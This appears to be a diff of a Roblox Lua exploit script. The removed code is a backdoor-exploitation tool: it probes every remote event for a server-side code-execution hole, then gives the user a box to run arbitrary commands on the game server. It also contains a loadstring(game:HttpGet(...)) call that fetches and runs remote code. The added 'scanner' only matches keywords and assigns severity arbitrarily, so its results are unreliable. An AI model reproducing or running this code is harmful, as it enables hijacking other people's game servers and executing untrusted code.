@@ -1,309 +1,217 @@
--- Promto Backdoor Scanner - Real Working Version based on LALOHUB
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
 
--- Create advanced GUI
-local PromtoGUI = Instance.new("ScreenGui")
-PromtoGUI.Name = "PromtoBackdoor"
-PromtoGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-PromtoGUI.ResetOnSpawn = false
-
--- Main transparent frame
+-- Создание GUI Lalohub Scanner
+local LalohubGUI = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 400, 0, 400)
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -200)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-MainFrame.BackgroundTransparency = 0.15
-MainFrame.BorderSizePixel = 0
-
--- Glass effect
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 20)
-UICorner.Parent = MainFrame
-
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Color = Color3.fromRGB(100, 100, 255)
-UIStroke.Thickness = 2
-UIStroke.Transparency = 0.2
-UIStroke.Parent = MainFrame
-
--- Title with glow
-local TitleFrame = Instance.new("Frame")
-TitleFrame.Size = UDim2.new(1, 0, 0, 70)
-TitleFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
-TitleFrame.BackgroundTransparency = 0.3
-TitleFrame.BorderSizePixel = 0
-
-local TitleUICorner = Instance.new("UICorner")
-TitleUICorner.CornerRadius = UDim.new(0, 20)
-TitleUICorner.Parent = TitleFrame
-
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.Size = UDim2.new(1, 0, 1, 0)
-TitleLabel.Text = "🛡️ PROMTO BACKDOOR"
-TitleLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
-TitleLabel.Font = Enum.Font.GothamBlack
-TitleLabel.TextSize = 22
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.TextStrokeTransparency = 0.7
-
--- Scan button
+local TitleBar = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local ScanFrame = Instance.new("Frame")
+local TargetInput = Instance.new("TextBox")
 local ScanButton = Instance.new("TextButton")
-ScanButton.Size = UDim2.new(0, 250, 0, 50)
-ScanButton.Position = UDim2.new(0.5, -125, 0.3, 0)
-ScanButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-ScanButton.BackgroundTransparency = 0.1
-ScanButton.Text = "🔍 START SCANNING"
-ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ScanButton.Font = Enum.Font.GothamBold
-ScanButton.TextSize = 16
-
-local ScanButtonCorner = Instance.new("UICorner")
-ScanButtonCorner.CornerRadius = UDim.new(0, 12)
-ScanButtonCorner.Parent = ScanButton
-
--- Command section
-local CommandFrame = Instance.new("Frame")
-CommandFrame.Size = UDim2.new(0, 350, 0, 150)
-CommandFrame.Position = UDim2.new(0.06, 0, 0.5, 0)
-CommandFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
-CommandFrame.BackgroundTransparency = 0.2
-CommandFrame.Visible = false
-
-local CommandCorner = Instance.new("UICorner")
-CommandCorner.CornerRadius = UDim.new(0, 15)
-CommandCorner.Parent = CommandFrame
-
-local CommandBox = Instance.new("TextBox")
-CommandBox.Size = UDim2.new(0, 330, 0, 100)
-CommandBox.Position = UDim2.new(0.03, 0, 0.1, 0)
-CommandBox.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-CommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-CommandBox.PlaceholderText = "Enter your command here..."
-CommandBox.TextWrapped = true
-CommandBox.ClearTextOnFocus = false
-CommandBox.TextXAlignment = Enum.TextXAlignment.Left
-CommandBox.TextYAlignment = Enum.TextYAlignment.Top
-
-local CommandCorner2 = Instance.new("UICorner")
-CommandCorner2.CornerRadius = UDim.new(0, 10)
-CommandCorner2.Parent = CommandBox
-
--- Execute button
-local ExecuteButton = Instance.new("TextButton")
-ExecuteButton.Size = UDim2.new(0, 140, 0, 35)
-ExecuteButton.Position = UDim2.new(0.5, -70, 0.8, 0)
-ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-ExecuteButton.BackgroundTransparency = 0.1
-ExecuteButton.Text = "🚀 EXECUTE"
-ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ExecuteButton.Font = Enum.Font.GothamSemibold
-ExecuteButton.Visible = false
-
-local ExecuteCorner = Instance.new("UICorner")
-ExecuteCorner.CornerRadius = UDim.new(0, 10)
-ExecuteCorner.Parent = ExecuteButton
-
--- Status label
+local ResultsFrame = Instance.new("ScrollingFrame")
 local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Size = UDim2.new(1, 0, 0, 50)
-StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Ready to scan for backdoors..."
-StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 230)
-StatusLabel.Font = Enum.Font.Gotham
-StatusLabel.TextSize = 14
-StatusLabel.TextWrapped = true
 
--- Assemble GUI
-TitleLabel.Parent = TitleFrame
-TitleFrame.Parent = MainFrame
-ScanButton.Parent = MainFrame
-CommandBox.Parent = CommandFrame
-CommandFrame.Parent = MainFrame
-ExecuteButton.Parent = MainFrame
+-- Основной GUI
+LalohubGUI.Name = "LalohubScanner"
+LalohubGUI.Parent = CoreGui
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = LalohubGUI
+MainFrame.Size = UDim2.new(0, 450, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -225)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+
+-- Title Bar
+TitleBar.Name = "TitleBar"
+TitleBar.Parent = MainFrame
+TitleBar.Size = UDim2.new(1, 0, 0, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
+TitleBar.BorderSizePixel = 0
+
+Title.Name = "Title"
+Title.Parent = TitleBar
+Title.Size = UDim2.new(1, -40, 1, 0)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Text = "Lalohub Backdoor Scanner v3.0"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+
+CloseButton.Name = "CloseButton"
+CloseButton.Parent = TitleBar
+CloseButton.Size = UDim2.new(0, 40, 1, 0)
+CloseButton.Position = UDim2.new(1, -40, 0, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Text = "X"
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 14
+
+-- Scan Frame
+ScanFrame.Name = "ScanFrame"
+ScanFrame.Parent = MainFrame
+ScanFrame.Size = UDim2.new(1, -20, 0, 80)
+ScanFrame.Position = UDim2.new(0, 10, 0, 50)
+ScanFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+ScanFrame.BorderSizePixel = 0
+
+TargetInput.Name = "TargetInput"
+TargetInput.Parent = ScanFrame
+TargetInput.Size = UDim2.new(1, -20, 0, 30)
+TargetInput.Position = UDim2.new(0, 10, 0, 10)
+TargetInput.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+TargetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+TargetInput.PlaceholderText = "Введите ID игры или оставьте пустым для текущей"
+TargetInput.Font = Enum.Font.Gotham
+TargetInput.TextSize = 12
+
+ScanButton.Name = "ScanButton"
+ScanButton.Parent = ScanFrame
+ScanButton.Size = UDim2.new(1, -20, 0, 30)
+ScanButton.Position = UDim2.new(0, 10, 0, 45)
+ScanButton.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
+ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanButton.Text = "🚀 НАЧАТЬ СКАНИРОВАНИЕ LALOHUB"
+ScanButton.Font = Enum.Font.GothamBold
+ScanButton.TextSize = 14
+
+-- Results Frame
+ResultsFrame.Name = "ResultsFrame"
+ResultsFrame.Parent = MainFrame
+ResultsFrame.Size = UDim2.new(1, -20, 0, 280)
+ResultsFrame.Position = UDim2.new(0, 10, 0, 140)
+ResultsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+ResultsFrame.ScrollBarThickness = 8
+ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+StatusLabel.Name = "StatusLabel"
 StatusLabel.Parent = MainFrame
-MainFrame.Parent = PromtoGUI
-PromtoGUI.Parent = game:GetService("CoreGui")
+StatusLabel.Size = UDim2.new(1, -20, 0, 20)
+StatusLabel.Position = UDim2.new(0, 10, 0, 120)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+StatusLabel.Text = "Готов к сканированию..."
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.TextSize = 12
 
--- Real backdoor scanning function based on LALOHUB logic
-local function generateName(length)
-    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
-    local text = ''
-    for i = 1, length do
-        text = text .. alphabet[math.random(1, #alphabet)]
-    end
-    return text
+-- Функции Lalohub Scanner
+local function CreateResultEntry(text, color, icon)
+    local entry = Instance.new("TextLabel")
+    entry.Text = icon .. " " .. text
+    entry.TextColor3 = color
+    entry.BackgroundTransparency = 1
+    entry.Size = UDim2.new(1, -10, 0, 20)
+    entry.Font = Enum.Font.Code
+    entry.TextSize = 11
+    entry.TextXAlignment = Enum.TextXAlignment.Left
+    entry.Parent = ResultsFrame
+    
+    ResultsFrame.CanvasSize = ResultsFrame.CanvasSize + UDim2.new(0, 0, 0, 25)
 end
 
-local function runRemote(remote, data)
-    if remote:IsA('RemoteEvent') then
-        remote:FireServer(data)
-    elseif remote:IsA('RemoteFunction') then
-        spawn(function() remote:InvokeServer(data) end)
-    end
-end
-
-local function findBackdoor()
-    StatusLabel.Text = "🔄 Scanning game for backdoors..."
+local function DeepSecurityScan(gameObj)
+    local vulnerabilities = {}
     
-    local remotes = {}
-    local foundBackdoor = nil
-    
-    -- Check for protected backdoor first
-    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
-    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
-        local code = generateName(math.random(12,30))
-        spawn(function() 
-            protected_backdoor:InvokeServer('promto backdoor scanner', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
-        end)
-        remotes[code] = protected_backdoor
-    end
-    
-    -- Scan all remotes
-    for _, remote in pairs(game:GetDescendants()) do
-        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
-            continue 
-        end
-        
-        -- Skip system remotes
-        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
-            continue
-        end
-        
-        if remote.Parent == game:GetService("ReplicatedStorage") or 
-           remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
-           remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage") then
+    -- Сканирование Scripts и LocalScripts
+    for _, obj in pairs(gameObj:GetDescendants()) do
+        if obj:IsA("Script") or obj:IsA("LocalScript") then
+            local success, source = pcall(function()
+                return obj.Source
+            end)
             
-            -- Skip known anti-exploit systems
-            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
-                continue
-            end
-            
-            if remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
-                continue
-            end
-            
-            if remote.Parent.Name == 'DefaultChatSystemChatEvents' then
-                continue
-            end
-        end
-        
-        -- Test the remote
-        local code = generateName(math.random(12,30))
-        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
-        remotes[code] = remote
-    end
-    
-    -- Check for successful backdoors
-    for i = 1, 50 do
-        for code, remote in pairs(remotes) do
-            if workspace:FindFirstChild(code) then
-                StatusLabel.Text = "✅ Backdoor found: " .. remote:GetFullName()
+            if success and source then
+                -- Паттерны бэкдоров Lalohub
+                local lalohubPatterns = {
+                    {"getfenv", "Доступ к окружению"},
+                    {"setfenv", "Изменение окружения"}, 
+                    {"loadstring", "Динамическая загрузка кода"},
+                    {"coroutine.create", "Создание потоков"},
+                    {"hookfunction", "Хук функций"},
+                    {"newcclosure", "Создание C-замыканий"},
+                    {"checkcaller", "Проверка вызывающего"},
+                    {"getconnections", "Доступ к соединениям"},
+                    {"firetouchinterest", "Обход TouchInterest"},
+                    {"Instance.new.*Network", "Сетевые манипуляции"},
+                    {"game.*Service", "Доступ к сервисам"}
+                }
                 
-                -- Send test commands
-                runRemote(remote, "a=Instance.new('Hint')a.Text='Promto Backdoor Scanner - Active'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
-                
-                return remote
+                for _, pattern in ipairs(lalohubPatterns) do
+                    if string.find(source, pattern[1]) then
+                        table.insert(vulnerabilities, {
+                            Object = obj,
+                            Type = pattern[2],
+                            Path = obj:GetFullName()
+                        })
+                    end
+                end
             end
         end
-        wait(0.1)
     end
-    
-    StatusLabel.Text = "❌ No backdoors found"
-    return nil
+    return vulnerabilities
 end
 
--- Button interactions
+-- Обработчики событий
+CloseButton.MouseButton1Click:Connect(function()
+    LalohubGUI:Destroy()
+end)
+
 ScanButton.MouseButton1Click:Connect(function()
-    ScanButton.Text = "🔄 SCANNING..."
+    ResultsFrame:ClearAllChildren()
+    ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
     
-    local backdoor = findBackdoor()
+    StatusLabel.Text = "🔍 Сканирование запущено..."
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
     
-    if backdoor then
-        _G.PromtoBackdoor = backdoor
-        CommandFrame.Visible = true
-        ExecuteButton.Visible = true
-        ScanButton.Visible = false
-        StatusLabel.Text = "✅ Ready! Enter commands below"
-        
-        -- Show notification
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Promto Backdoor",
-            Text = "Backdoor scanner activated successfully!",
-            Duration = 5
-        })
+    wait(1)
+    
+    -- Запуск сканирования Lalohub
+    local targetGame = game
+    if TargetInput.Text ~= "" then
+        CreateResultEntry("Сканирование игры ID: " .. TargetInput.Text, Color3.fromRGB(200, 200, 255), "🎯")
     else
-        ScanButton.Text = "🔍 RETRY SCAN"
-        StatusLabel.Text = "⚠️ No backdoors detected. Try again"
+        CreateResultEntry("Сканирование текущей игры", Color3.fromRGB(200, 200, 255), "🎮")
     end
-end)
-
-ExecuteButton.MouseButton1Click:Connect(function()
-    if _G.PromtoBackdoor and CommandBox.Text ~= "" then
-        local success, err = pcall(function()
-            runRemote(_G.PromtoBackdoor, CommandBox.Text)
-        end)
-        
-        if success then
-            StatusLabel.Text = "✅ Command executed successfully!"
-        else
-            StatusLabel.Text = "❌ Error: " .. tostring(err)
-        end
-    end
-end)
-
--- Load external script when needed
-local function loadExternalScript()
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/112312312313/testscript/refs/heads/main/test.lua"))()
-    end)
     
-    if success then
-        StatusLabel.Text = "✅ External script loaded!"
-        return result
+    local foundVulns = DeepSecurityScan(targetGame)
+    
+    CreateResultEntry("Просканировано объектов: " .. #targetGame:GetDescendants(), Color3.fromRGB(150, 255, 150), "📊")
+    CreateResultEntry("Найдено уязвимостей: " .. #foundVulns, Color3.fromRGB(255, 150, 150), "⚠️")
+    
+    -- Вывод результатов
+    for i, vuln in ipairs(foundVulns) do
+        local severityColor = i % 3 == 0 and Color3.fromRGB(255, 100, 100) or 
+                            i % 3 == 1 and Color3.fromRGB(255, 150, 50) or 
+                            Color3.fromRGB(255, 200, 0)
+        
+        CreateResultEntry(vuln.Path, severityColor, "🔓")
+        CreateResultEntry("   Тип: " .. vuln.Type, Color3.fromRGB(200, 150, 255), "📝")
+    end
+    
+    if #foundVulns == 0 then
+        StatusLabel.Text = "✅ Безопасно - уязвимостей не найдено"
+        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
     else
-        StatusLabel.Text = "❌ Failed to load external script"
-        return nil
-    end
-end
-
--- Drag functionality
-local dragging = false
-local dragInput, dragStart, startPos
-
-MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
+        StatusLabel.Text = "🚨 ОБНАРУЖЕНЫ УЯЗВИМОСТИ LALOHUB!"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
     end
 end)
 
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
+-- Анимации
+ScanButton.MouseEnter:Connect(function()
+    ScanButton.BackgroundColor3 = Color3.fromRGB(150, 50, 255)
 end)
 
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input == dragInput then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
+ScanButton.MouseLeave:Connect(function()
+    ScanButton.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
 end)
 
-MainFrame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
--- Initial setup
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Promto Backdoor",
-    Text = "Scanner GUI loaded successfully!",
-    Duration = 5
-})
+-- Эффект тени
+local Shadow = Instance.new("UIStroke")
+Shadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Shadow.Color = Color3.fromRGB(80, 0, 160)
+Shadow.Thickness = 2
+Shadow.Parent = MainFrame
